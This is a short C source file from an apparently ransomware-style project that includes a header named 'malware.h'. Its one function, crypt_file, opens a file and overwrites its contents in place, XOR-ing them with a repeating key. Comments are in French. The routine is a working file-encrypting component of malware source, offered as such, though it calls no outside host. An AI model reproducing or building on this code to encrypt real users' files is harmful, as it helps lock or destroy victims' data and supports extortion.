#include "../includes/malware.h"

int crypt_file(char *path, unsigned char *key) {
    FILE    *file = fopen(path, "rb+");
    if (file == NULL)
        return perror("Erreur lors de l'ouverture du fichier"), -1;

    char    buffer[BUFFER_SIZE];
    int     bytes_read;
    size_t  key_size = strlen((const char *) key);
    size_t  keyIndex = 0;
    
    while ((bytes_read = fread(buffer, 1, BUFFER_SIZE, file)) > 0) {
        // Retour au début du buffer lu
        fseek(file, -bytes_read, SEEK_CUR);

        for (int i = 0; i < bytes_read; ++i) {
            buffer[i] ^= key[keyIndex];
            keyIndex = (keyIndex + 1) % key_size;
        }

        // Écriture du buffer modifié
        fwrite(buffer, 1, bytes_read, file);
    }

    return fclose(file), 0;
}